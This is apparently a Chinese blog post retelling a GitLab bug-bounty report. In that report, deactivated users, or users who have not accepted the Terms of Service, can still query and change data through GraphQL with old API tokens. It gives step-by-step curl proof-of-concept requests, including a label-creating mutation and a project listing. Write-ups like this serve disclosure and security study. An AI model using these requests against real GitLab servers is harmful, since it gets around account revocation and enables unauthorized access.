gitlab漏洞系列-停用的用户可以通过GraphQL越权访问数据

声明：文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任

背景

提交这个漏洞的小哥名字叫joaxcar，在去年5月份提交的;先大概概括一下这个漏洞:

gitlab官方文档中指出:一个停用的用户应该不能通过API访问信息。但是当通过GraphQL接口发出请求时，却可以通过API访问信息。

复现步骤

对于无限制的服务账户: 1.以admin的身份登陆;

2.创建一个用户

3.将此用户禁用

4.为此停用的用户创建一个api令牌

5.在GraphQL请求中使用令牌，例如(测试时注意替换url和令牌)curl 'https://gitlab.com/api/graphql' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'Authorization: Bearer <<TOKEN>>' --data '{"query":"{\n currentUser{id}\n}"}'d

6.账户已停用的用户发出如下请求: (令牌为停用帐户中的任何旧令牌)curl 'https://gitlab.com/api/graphql' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'Authorization: Bearer <<TOKEN>>' --data '{"query":"{\n currentUser{id}\n}"}'d

对于在13.11.2版本之前的服务器上(在13.11.1上测试) 1.以admin的身份登陆;

2.创建一个用户

3.将此用户禁用

4.为此停用的用户创建一个api令牌

5.(使用管理令牌和真实的项目id)将用户添加到项目中curl --header "Authorization: Bearer <<ADMIN TOKEN>>" "https://gitlab.domain.com/api/v4/projects//members" --data "user_id=2&access_level=40"

6.然后对被禁用的帐户执行如下操作来创建一个标签:curl 'https://gitlab.domain.com/api/graphql' -H 'Content-Type: application/json' -H 'Accept: application/json' -H 'Authorization: Bearer <<DEACTIVATEDTOKEN>>' --data '{"query":"mutation {\n labelCreate(input:{title:\"deactivated\", projectPath:\"test1/test1\"}){\n errors\n label{\n id\n }\n }\n}"}'

当时这位小哥把这份报告提交上去之后,gitlab官方一开始是认为他提交的是重复的,在经过讨论和解释之后，这位小哥又重新给出了一个比较详细的复现步骤:

1.以admin的身份登陆;

2.跳转至 https://gitlab.domain.com/admin/application_settings/general

3.确保“服务条款和隐私政策”已禁用

4.以正常用户登录

5.跳转至  https://gitlab.domain.com/-/profile/personal_access_tokens  并创建一个api的令牌;

6.再次以admin的身份登陆

7.再次跳转至 https://gitlab.domain.com/admin/application_settings/general

8.现在激活“服务条款和隐私政策”(如果普通用户在另一个浏览器窗口仍然登录，点击弹出的“拒绝并注销”)

9.使用步骤5中的用户令牌发出REST API请求curl --header "Authorization: Bearer <TOKEN>" "https://gitlab.domain.com/api/v4/user"

响应为:

"message": "403 Forbidden - You ([@]unwilling) must accept the Terms of Service in order to perform this action. Please access GitLab from a web browser to accept these terms."10.使用步骤5中的用户令牌发出GraphQL API请求

curl 'https://gitlab.domain.com/api/graphql' \
-H 'Content-Type: application/json' \
-H 'Authorization: Bearer <TOKEN>' \
--data '{"query":"query {\n  currentUser {\n    id\n    username\n    name\n  }\n}\n"}'

响应为:(成功了)

{
  "data": {
    "currentUser": {
      "id": "gid://gitlab/User/61",
      "username": "unwilling",
      "name": "Unwilling User"
    }
  }
}

有兴趣可以发送下面的请求:

curl 'https://gitlab.domain.com/api/graphql' \
-H 'Content-Type: application/json' \
-H 'Authorization: Bearer <TOKEN>' \
--data '{"query":"query {\nprojects{\n  nodes{\n    id\n    name\n  }\n}\n}\n"}'
